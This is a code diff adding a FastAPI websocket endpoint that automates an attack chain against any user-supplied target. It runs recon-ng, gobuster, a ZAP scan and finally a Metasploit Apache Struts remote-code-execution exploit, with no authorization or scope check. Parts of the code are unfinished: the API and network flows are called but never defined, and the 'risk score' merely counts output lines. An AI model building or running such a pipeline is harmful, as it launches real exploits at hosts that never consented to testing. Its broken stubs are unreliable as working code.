@@ -1,0 +1,71 @@
+from fastapi import APIRouter, Query, HTTPException, WebSocket
+from fastapi.websockets import WebSocketDisconnect
+import subprocess
+import yaml
+import os
+import asyncio
+from ...services.ai_scanner.scanner import calculate_risk
+
+router = APIRouter()
+
+# Existing /vuln, /playbook/run ...
+
+@router.websocket("/ws/scan")
+async def websocket_scan(websocket: WebSocket):
+    await websocket.accept()
+    try:
+        data = await websocket.receive_json()
+        target = data.get('target')
+        flow = data.get('flow', 'web')  # web/api/network
+        
+        # AI-driven flow selection (mock expand)
+        asset_type = detect_asset_type(target)  # Implement: nmap quick scan
+        
+        results = []
+        if flow == 'web' or asset_type == 'web':
+            results = await run_web_flow(target, websocket)
+        elif flow == 'api' or asset_type == 'api':
+            results = await run_api_flow(target, websocket)
+        elif flow == 'network' or asset_type == 'network':
+            results = await run_network_flow(target, websocket)
+        
+        total_vulns = sum(len(r.splitlines()) for r in results)
+        risk = calculate_risk(total_vulns)
+        await websocket.send_json({"risk_score": risk, "complete": True})
+    except WebSocketDisconnect:
+        pass
+
+async def run_web_flow(target: str, ws: WebSocket):
+    outputs = []
+    # Step 2A: Recon
+    recon = subprocess.run(["recon-ng", "-w", "workspace", "-r", f"recon/domains-hosts/brute_hosts {target}"], capture_output=True, text=True)
+    await ws.send_json({"step": "recon", "output": recon.stdout})
+    outputs.append(recon.stdout)
+    
+    # Step 3A: Enumeration (conditional: if subdomains >0)
+    if 'subdomains' in recon.stdout:
+        gobuster = subprocess.run(["gobuster", "dir", "-u", target, "-w", "/wordlists/common.txt"], capture_output=True, text=True)
+        await ws.send_json({"step": "enum", "output": gobuster.stdout})
+        outputs.append(gobuster.stdout)
+    
+    # Step 4A: Vuln Scan
+    zap = subprocess.run(["zap-cli", "quick-scan", target], capture_output=True, text=True)  # Assume ZAP installed
+    await ws.send_json({"step": "vuln", "output": zap.stdout})
+    outputs.append(zap.stdout)
+    
+    # Step 5A: Exploit
+    msf = subprocess.run(["msfconsole", "-q", "-x", f"use exploit/multi/http/struts_dmi_exec; set RHOSTS {target}; run; exit"], capture_output=True, text=True)
+    await ws.send_json({"step": "exploit", "output": msf.stdout})
+    outputs.append(msf.stdout)
+    
+    return outputs
+
+# Similarly define run_api_flow, run_network_flow with respective tools/steps
+
+def detect_asset_type(target: str) -> str:
+    nmap_quick = subprocess.run(["nmap", "-sV", "--top-ports", "10", target], capture_output=True, text=True)
+    if 'http' in nmap_quick.stdout:
+        return 'web'
+    elif 'api' in target.lower():
+        return 'api'
+    return 'network'
